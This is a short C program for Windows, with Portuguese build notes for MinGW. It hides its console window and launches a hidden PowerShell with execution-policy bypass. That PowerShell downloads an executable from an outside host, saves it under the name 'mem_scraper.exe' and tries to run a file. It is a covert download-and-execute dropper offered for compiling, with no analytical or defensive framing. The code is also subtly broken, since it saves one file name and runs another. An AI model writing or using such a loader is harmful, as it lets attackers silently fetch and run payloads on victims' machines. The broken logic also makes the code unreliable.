#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <aclapi.h>
#include <shlobj.h>
#include <windows.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
/*
# No Windows
Donwload gcc-4.9-win32 in http://sourceforge.net/projects/mingw-w64/files/latest/download
$ gcc main.c -o main.exe -lws2_32
# No Linux 
$ apt-get install mingw32
$ i586-mingw32msvc-gcc main.c -o main.exe -lws2_32
*/

int main(int argc, char *argv[]) {
FreeConsole();
 ShellExecute(NULL,NULL, "powershell.exe", "-exec bypass -Command (New-Object Net.WebClient).DownloadFile('http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe','mem_scraper.exe');./putty.exe;",NULL,SW_HIDE);
exit(0);
}
